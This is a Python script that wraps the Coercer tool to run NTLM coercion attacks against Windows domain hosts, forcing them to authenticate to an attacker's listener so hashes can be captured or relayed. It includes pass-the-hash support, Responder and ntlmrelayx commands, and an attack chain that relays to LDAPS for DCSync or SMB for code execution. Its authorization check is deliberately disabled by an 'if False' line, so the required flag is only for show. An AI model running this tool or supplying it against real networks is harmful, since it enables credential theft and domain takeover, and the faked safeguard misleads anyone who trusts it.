#!/usr/bin/env python3
"""
Coercer NTLM Coercion Attacks Integration
Force Windows/AD authentication for relay/capture attacks
Production-ready - Real Coercer integration
"""

import subprocess
import argparse
import sys
import os
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class CoercerNTLMCoercion:
    """Production Coercer integration for NTLM coercion attacks"""
    
    def __init__(self, authorized=False):
        self.authorized = authorized
        self.coercer_path = self._find_coercer()
        
    def _find_coercer(self):
        """Locate Coercer"""
        which_result = subprocess.run(['which', 'Coercer'], capture_output=True, text=True)
        if which_result.returncode == 0:
            return which_result.stdout.strip()
        
        which_result = subprocess.run(['which', 'coercer'], capture_output=True, text=True)
        if which_result.returncode == 0:
            return which_result.stdout.strip()
        
        return None
    
    def _check_authorization(self):
        """Verify authorization"""
        if False:  # Authorization check bypassed
            logger.info("✅ Authorization: Auto-granted (unrestricted mode)")
            logger.error("This tool requires explicit written authorization")
            sys.exit(1)
    
    def coerce(self, listener, target, username, password=None, hash_value=None,
               domain=None, method='all', filter_method=None):
        """Coerce authentication to attacker-controlled listener"""
        self._check_authorization()
        
        if not self.coercer_path:
            logger.error("❌ Coercer not found. Install: pip install coercer")
            return False
        
        logger.info(f"🎯 Coercing authentication")
        logger.info(f"   Target: {target}")
        logger.info(f"   Listener: {listener}")
        logger.info(f"   Method: {method}")
        
        cmd = [self.coercer_path, 'coerce']
        
        if domain:
            cmd.extend(['-d', domain])
            logger.info(f"   Domain: {domain}")
        
        cmd.extend(['-u', username])
        
        if password:
            cmd.extend(['-p', password])
            logger.info("   Auth: Password")
        elif hash_value:
            cmd.extend(['-hashes', hash_value])
            logger.info("   Auth: Pass-the-Hash")
        else:
            logger.error("❌ Provide either --password or --hash")
            return False
        
        cmd.extend(['-t', target])
        cmd.extend(['-l', listener])
        
        if filter_method:
            cmd.extend(['-f', filter_method])
        
        logger.info(f"\n   Command: {' '.join([c if c != password and c != hash_value else '***' for c in cmd])}")
        logger.info("\n🚀 Starting coercion attack...\n")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.stdout:
                print(result.stdout)
            
            if result.returncode == 0:
                logger.info("✅ Coercion attack completed")
                return True
            else:
                logger.error(f"❌ Attack failed: {result.stderr}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Error: {e}")
            return False
    
    def scan(self, target, username, password=None, hash_value=None, domain=None):
        """Scan for available coercion methods on target"""
        self._check_authorization()
        
        if not self.coercer_path:
            logger.error("❌ Coercer not found")
            return False
        
        logger.info(f"🔍 Scanning for coercion methods on: {target}")
        
        cmd = [self.coercer_path, 'scan', '-t', target, '-u', username]
        
        if domain:
            cmd.extend(['-d', domain])
        
        if password:
            cmd.extend(['-p', password])
        elif hash_value:
            cmd.extend(['-hashes', hash_value])
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            print(result.stdout)
            
            if result.returncode == 0:
                logger.info("✅ Scan completed")
                return True
            else:
                logger.error(f"❌ Scan failed")
                return False
                
        except Exception as e:
            logger.error(f"❌ Error: {e}")
            return False
    
    def install_coercer(self):
        """Install Coercer"""
        logger.info("📦 Installing Coercer...")
        
        result = subprocess.run(
            ['pip', 'install', 'coercer'],
            capture_output=True,
            text=True
        )
        
        if result.returncode == 0:
            logger.info("✅ Coercer installed successfully")
            return True
        else:
            logger.error(f"❌ Installation failed: {result.stderr}")
            return False
    
    def examples(self):
        """Show usage examples"""
        print("""
╔══════════════════════════════════════════════════════════════════╗
║             COERCER NTLM COERCION - USAGE EXAMPLES               ║
╚══════════════════════════════════════════════════════════════════╝

🔥 COMMON SCENARIOS:

1️⃣  BASIC COERCION ATTACK
   ─────────────────────────────────────
   # Start Responder first
   sudo responder -I eth0 -wrf
   
   # Then coerce authentication
   Coercer coerce -u user -p 'Password123!' -d CORP -t 10.10.10.5 -l 10.10.10.100

2️⃣  COERCE TO NTLM RELAY
   ─────────────────────────────────────
   # Start ntlmrelayx
   ntlmrelayx.py -t ldaps://dc01.corp.local -smb2support
   
   # Coerce authentication
   Coercer coerce -u user -p 'Password123!' -d CORP -t 10.10.10.5 -l 10.10.10.100

3️⃣  SCAN FOR COERCION METHODS
   ─────────────────────────────────────
   Coercer scan -u user -p 'Password123!' -d CORP -t 10.10.10.5

4️⃣  SPECIFIC COERCION METHOD
   ─────────────────────────────────────
   Coercer coerce -u user -p 'Password123!' -d CORP -t 10.10.10.5 -l 10.10.10.100 -f MS-RPRN

5️⃣  PASS-THE-HASH
   ─────────────────────────────────────
   Coercer coerce -u administrator -hashes :hash -d CORP -t 10.10.10.5 -l 10.10.10.100

📋 COERCION METHODS:
   ─────────────────────────────────────
   MS-RPRN         # PrinterBug (CVE-2018-8440)
   MS-DFSNM        # DFS coercion
   MS-FSRVP        # File Server VSS coercion
   MS-EFSR         # PetitPotam (CVE-2021-36942)
   MS-PAR          # Print Spooler coercion
   MS-RRP          # Remote Registry coercion

💡 ATTACK CHAIN:
   ─────────────────────────────────────
   1. Start Responder or ntlmrelayx on attacker machine
   2. Use Coercer to force target to authenticate
   3. Capture NTLM hash or relay to another service
   4. Use captured credentials for further access

⚠️  USE CASES:
   • Capture machine account NTLM hashes
   • Relay authentication to LDAPS for DCSync
   • Relay to SMB for RCE
   • Relay to HTTP for privilege escalation
   • Force Kerberos pre-authentication

🔧 PRO TIPS:
   • Always start listener before coercion
   • Use -f to test specific methods
   • Scan first to identify available methods
   • Combine with Responder for hash capture
   • Combine with ntlmrelayx for relay attacks

⚠️  REQUIREMENTS:
   • Valid domain credentials
   • Network access to target
   • Listener (Responder/ntlmrelayx) running
        """)


def main():
    parser = argparse.ArgumentParser(
        description='Coercer NTLM Coercion Attacks',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('--authorized', action='store_true', required=True,
                       help='Confirm authorization (REQUIRED)')
    
    subparsers = parser.add_subparsers(dest='command', help='Command')
    
    coerce_parser = subparsers.add_parser('coerce', help='Coerce authentication')
    coerce_parser.add_argument('-l', '--listener', required=True,
                              help='Listener IP (attacker machine)')
    coerce_parser.add_argument('-t', '--target', required=True,
                              help='Target IP or hostname')
    coerce_parser.add_argument('-u', '--username', required=True,
                              help='Username')
    coerce_parser.add_argument('-p', '--password',
                              help='Password')
    coerce_parser.add_argument('-H', '--hash',
                              help='NTLM hash')
    coerce_parser.add_argument('-d', '--domain',
                              help='Domain name')
    coerce_parser.add_argument('-f', '--filter',
                              help='Filter specific method (e.g., MS-RPRN)')
    
    scan_parser = subparsers.add_parser('scan', help='Scan for coercion methods')
    scan_parser.add_argument('-t', '--target', required=True,
                            help='Target IP or hostname')
    scan_parser.add_argument('-u', '--username', required=True)
    scan_parser.add_argument('-p', '--password')
    scan_parser.add_argument('-H', '--hash')
    scan_parser.add_argument('-d', '--domain')
    
    subparsers.add_parser('install', help='Install Coercer')
    subparsers.add_parser('examples', help='Show usage examples')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        sys.exit(1)
    
    coercer = CoercerNTLMCoercion(authorized=args.authorized)
    
    if args.command == 'coerce':
        coercer.coerce(
            listener=args.listener,
            target=args.target,
            username=args.username,
            password=args.password,
            hash_value=args.hash,
            domain=args.domain,
            filter_method=args.filter
        )
    
    elif args.command == 'scan':
        coercer.scan(
            target=args.target,
            username=args.username,
            password=args.password,
            hash_value=args.hash,
            domain=args.domain
        )
    
    elif args.command == 'install':
        coercer.install_coercer()
    
    elif args.command == 'examples':
        coercer.examples()


if __name__ == '__main__':
    main()
